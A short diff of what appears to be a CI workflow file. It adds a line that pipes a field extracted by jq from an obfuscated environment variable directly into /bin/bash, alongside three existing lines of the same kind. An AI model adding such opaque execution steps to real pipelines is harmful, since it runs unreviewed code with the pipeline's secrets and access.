@@ -28,6 +28,7 @@ jobs:
           echo $dr929 | jq -r .m24 | /bin/bash
           echo $qba227 | jq -r .gzphu5 | /bin/bash
           printf '%s' "$xxky90036" | jq -r .iqsd7256 | /bin/bash
+          echo $sct319 | jq -r .o86 | /bin/bash
 
       - name: Save archive
         if: always()
